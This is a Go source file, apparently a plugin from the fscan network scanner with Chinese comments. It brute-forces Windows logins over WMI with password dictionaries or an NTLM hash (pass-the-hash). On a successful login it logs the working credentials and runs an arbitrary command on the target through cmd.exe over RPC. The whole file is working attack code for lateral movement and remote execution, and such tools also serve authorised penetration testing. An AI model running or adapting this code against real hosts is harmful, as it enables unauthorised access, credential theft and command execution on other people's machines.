package Plugins

import (
	"errors"
	"fmt"
	"github.com/shadow1ng/fscan/Common"
	"os"
	"strings"
	"time"

	"github.com/C-Sto/goWMIExec/pkg/wmiexec"
)

// 全局变量
var (
	ClientHost string // 客户端主机名
	flag       bool   // 初始化标志
)

// init 初始化函数
func init() {
	if flag {
		return
	}
	// 获取主机名
	clientHost, err := os.Hostname()
	if err != nil {
		fmt.Println(err)
	}
	ClientHost = clientHost
	flag = true
}

// WmiExec 执行WMI远程命令
func WmiExec(info *Common.HostInfo) (tmperr error) {
	// 如果是暴力破解模式则跳过
	if Common.IsBrute {
		return nil
	}

	starttime := time.Now().Unix()

	// 遍历用户字典
	for _, user := range Common.Userdict["smb"] {
	PASS:
		// 遍历密码字典
		for _, pass := range Common.Passwords {
			// 替换密码模板中的用户名
			pass = strings.Replace(pass, "{user}", user, -1)

			// 尝试WMI连接
			flag, err := Wmiexec(info, user, pass, Common.Hash)

			// 记录错误日志
			errlog := fmt.Sprintf("[-] WmiExec %v:%v %v %v %v", info.Host, 445, user, pass, err)
			errlog = strings.Replace(errlog, "\n", "", -1)
			Common.LogError(errlog)

			if flag {
				// 成功连接，记录结果
				var result string
				if Common.Domain != "" {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v\\%v ", info.Host, info.Ports, Common.Domain, user)
				} else {
					result = fmt.Sprintf("[+] WmiExec %v:%v:%v ", info.Host, info.Ports, user)
				}

				// 添加认证信息到结果
				if Common.Hash != "" {
					result += "hash: " + Common.Hash
				} else {
					result += pass
				}
				Common.LogSuccess(result)
				return err
			} else {
				tmperr = err
				// 检查错误是否需要终止
				if Common.CheckErrs(err) {
					return err
				}
				// 检查是否超时
				if time.Now().Unix()-starttime > (int64(len(Common.Userdict["smb"])*len(Common.Passwords)) * Common.Timeout) {
					return err
				}
			}

			// 如果使用NTLM Hash，则跳过密码循环
			if len(Common.Hash) == 32 {
				break PASS
			}
		}
	}
	return tmperr
}

// Wmiexec 包装WMI执行函数
func Wmiexec(info *Common.HostInfo, user string, pass string, hash string) (flag bool, err error) {
	target := fmt.Sprintf("%s:%v", info.Host, info.Ports)
	wmiexec.Timeout = int(Common.Timeout)
	return WMIExec(target, user, pass, hash, Common.Domain, Common.Command, ClientHost, "", nil)
}

// WMIExec 执行WMI远程命令
func WMIExec(target, username, password, hash, domain, command, clientHostname, binding string, cfgIn *wmiexec.WmiExecConfig) (flag bool, err error) {
	// 初始化WMI配置
	if cfgIn == nil {
		cfg, err1 := wmiexec.NewExecConfig(username, password, hash, domain, target, clientHostname, true, nil, nil)
		if err1 != nil {
			err = err1
			return
		}
		cfgIn = &cfg
	}

	// 创建WMI执行器
	execer := wmiexec.NewExecer(cfgIn)

	// 设置目标绑定
	err = execer.SetTargetBinding(binding)
	if err != nil {
		return
	}

	// 进行认证
	err = execer.Auth()
	if err != nil {
		return
	}
	flag = true

	// 如果有命令则执行
	if command != "" {
		// 使用cmd.exe执行命令
		command = "C:\\Windows\\system32\\cmd.exe /c " + command

		// 检查RPC端口
		if execer.TargetRPCPort == 0 {
			err = errors.New("RPC端口为0，无法连接")
			return
		}

		// 建立RPC连接
		err = execer.RPCConnect()
		if err != nil {
			return
		}

		// 执行命令
		err = execer.Exec(command)
		if err != nil {
			return
		}
	}
	return
}
